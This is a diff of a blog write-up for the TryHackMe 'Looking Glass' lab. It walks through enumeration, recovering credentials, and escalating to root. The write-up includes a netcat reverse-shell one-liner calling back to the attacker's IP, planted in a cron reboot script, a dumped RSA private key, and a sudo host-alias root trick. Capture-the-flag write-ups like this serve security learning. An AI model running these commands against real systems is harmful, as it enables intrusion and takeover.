@@ -1,59 +1,66 @@
+---
+title: "Looking Glass"
+date: 2022-09-20T16:00:31+01:00
+draft: false
+categories:
+  - TryHackMe
+---
+
+{{< post-img src="looking-glass.png" alt="looking-glass" style="width: 200px;" >}}
+
 ## Enumeration
 
-### rustscan + nmap
-
-```
-| ssh-hostkey: 
+```bash
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13641/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13642/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 
 [...MAD LONG OUTPUT...]
 
 13991/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13992/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13996/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13997/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13998/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 13999/tcp open  ssh        syn-ack Dropbear sshd (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
 |_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIwq6A6GoOKBf5gqbBoW5htBEPOpavx74++BhrEpg5zKxDBcvXPUoKkhDXxPBI/1nMnFWue/EYiHmtRWCHQslXPIiqDgAM0lXgYACZoyAQ+yPe62u8Ko5XeQIaOmNPNlqYxCXc2xbuG3CKQFUm8XhJEbzLXUNggn1Q70xrMGupT4dsfhSTlp45W1+3OFeuDopeQMVf8FxsiD2/MLaETG+l2QelQpU8TiggthHoOReu8nh/pOedTL8Aof4GnNS9X/eWsVZo9Wum6r4oWgx9nTblCXwaOCdA+okR1eSLZO0NVOnbZGGhyjWGiJYAApHFNipCpiDMa3kn15zEaYi5lYpn
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-
 ```
+
 WTF is all those open ports? This scan took me a bit...
 
 All of those are SSH??? (lol)
 
-ok This was a fun trickery: if you connect to any port it says either "higher" or "lower", but its actually the opposite you should do. 
+ok This was a fun trickery: if you connect to any port it says either "higher" or "lower", but its actually the opposite you should do.
 
 By example I connected to the very last open port and it said "higher"
 
-```
+```bash
 └──╼ $ssh 10.10.20.224 -p 13999
 The authenticity of host '[10.10.20.224]:13999 ([10.10.20.224]:13999)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
@@ -64,7 +71,7 @@ Higher
 
 So let's try random ports lower
 
-```
+```bash
 └──╼ $ssh 10.10.20.224 -p 11975
 The authenticity of host '[10.10.20.224]:11975 ([10.10.20.224]:11975)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
@@ -73,11 +80,11 @@ Warning: Permanently added '[10.10.20.224]:11975' (RSA) to the list of known hos
 Lower
 Connection to 10.10.20.224 closed.
 ```
-So I can do this an keep on reducing the range (wow repetitive tasks are so much fun)
 
+So I can do this an keep on reducing the range (wow repetitive tasks are so much fun)
 After playing "hot and cold" we get this:
 
-```
+```bash
 └──╼ $ssh 10.10.20.224 -p 12612
 The authenticity of host '[10.10.20.224]:12612 ([10.10.20.224]:12612)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
@@ -125,12 +132,11 @@ Enter Secret:
 ```
 
 Not ROT13...more like vigenère but I got no key...
-
 hey! let's try to bruteforce it online...
 
 Bingo! once we submit the secret we found, we get `jabberwock` credentials
 
-```
+```bash
 Eew ale xdte semja dbxxkhfe.
 Jdbr tivtmi pw sxderpIoeKeudmgdstd
 Enter Secret:
@@ -139,7 +145,7 @@ jabberwock:CornersHoldingNicelyStopped
 
 ## Exploitation
 
-```
+```bash
 jabberwock@looking-glass:~$ ls -al
 total 44
 drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 .
@@ -159,7 +165,7 @@ jabberwock@looking-glass:~$ cat user.txt
 
 ```
 
-```
+```bash
 jabberwock@looking-glass:~$ sudo -l
 Matching Defaults entries for jabberwock on looking-glass:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -169,7 +175,7 @@ User jabberwock may run the following commands on looking-glass:
 ```
 Lol what?
 
-```
+```bash
 jabberwock@looking-glass:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -190,18 +196,17 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 Oh okay!
 
-
-```
+```bash
 jabberwock@looking-glass:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.4.19 4444 >/tmp/f" > twasBrillig.sh
 jabberwock@looking-glass:~$ sudo reboot
 Connection to 10.10.20.224 closed by remote host.
 Connection to 10.10.20.224 closed.
 ```
-Be careful there! 
 
+Be careful there!
 if you mess up, you have to re-do everything, as you are rebooting the machine!
 
-```
+```bash
 └──╼ $nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 37914
@@ -210,7 +215,7 @@ $ id
 uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
 ```
 
-```
+```bash
 $ ls
 humptydumpty.txt
 poem.txt
@@ -223,14 +228,13 @@ fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
 b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
 7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
-
 ```
 
 Seriously...you got this one
 
 `the password is [REDACTED]`
 
-```
+```bash
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 tweedledum@looking-glass:~$ su humptydumpty
 su humptydumpty
@@ -240,14 +244,13 @@ humptydumpty@looking-glass:/home/tweedledum$ id
 id
 uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
 ```
-That guy just got another POEM in his folder so dead-end!
 
+That guy just got another POEM in his folder so dead-end!
 after a mad long time of confused enumeration (linpeas and stuff), we notice we have some weird permissions over alice folder
 
 We have execute permission!
 
-
-```
+```bash
 humptydumpty@looking-glass:~$ cat /home/alice/.ssh/id_rsa
 cat /home/alice/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY-----
@@ -272,7 +275,7 @@ aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
 -----END RSA PRIVATE KEY-----
 ```
 
-```
+```bash
 └──╼ $chmod 600 alice.rsa
 
 └──╼ $ssh alice@10.10.20.224 -i alice.rsa
@@ -282,15 +285,15 @@ Now what?
 
 After another big time of confusion (forums and stuff) I got it!
 
-```
+```bash
 alice@looking-glass:~$ cat /etc/sudoers.d/alice
 alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
 ```
-Alice can get a root shell on the host but "reversed" 
 
+Alice can get a root shell on the host but "reversed"
 so we specify the host in our sudo command
 
-```
+```bash
 alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
 sudo: unable to resolve host ssalg-gnikool
 root@looking-glass:~# id
@@ -298,7 +301,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 that was cool!
 
-```
+```bash
 root@looking-glass:/root# cat the_end.txt
 She took her off the table as she spoke, and shook her backwards and forwards with all her might.
 
@@ -310,6 +313,4 @@ The Red Queen made no resistance whatever; only her face grew very small, and he
 ## Extra notes:
 
 This machine was very original and fun, and reading the afterwards forums I learnt that the correct SSH port and first access credentials changed on every reboot!
-So my port might be different from yours and I think it's a great thing! 
-
-
+So my port might be different from yours and I think it's a great thing!
